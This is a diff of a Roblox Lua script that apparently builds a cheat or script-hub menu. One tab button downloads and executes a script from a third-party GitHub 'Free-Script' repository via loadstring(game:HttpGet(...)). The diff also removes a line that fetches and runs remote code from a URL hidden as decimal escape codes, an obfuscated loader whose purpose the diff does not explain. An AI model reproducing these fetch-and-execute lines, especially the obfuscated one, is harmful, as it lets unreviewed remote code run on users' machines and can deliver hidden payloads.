@@ -303,5 +303,3 @@ Tab:AddButton({
 })
 
 local Tab = Window:MakeTab({ Name = "海贼王", Icon = "rbxassetid://7734068321", PremiumOnly = false }) Tab:AddButton({ 	Name = "海贼王", 	Callback = function() 	loadstring(game:HttpGet"https://raw.githubusercontent.com/xDepressionx/Free-Script/main/AllScript.lua")() 	end })
-
-loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\115\99\114\105\112\116\115\46\118\105\115\117\114\117\115\46\100\101\118\47\111\104\105\111\47\115\111\117\114\99\101"))()
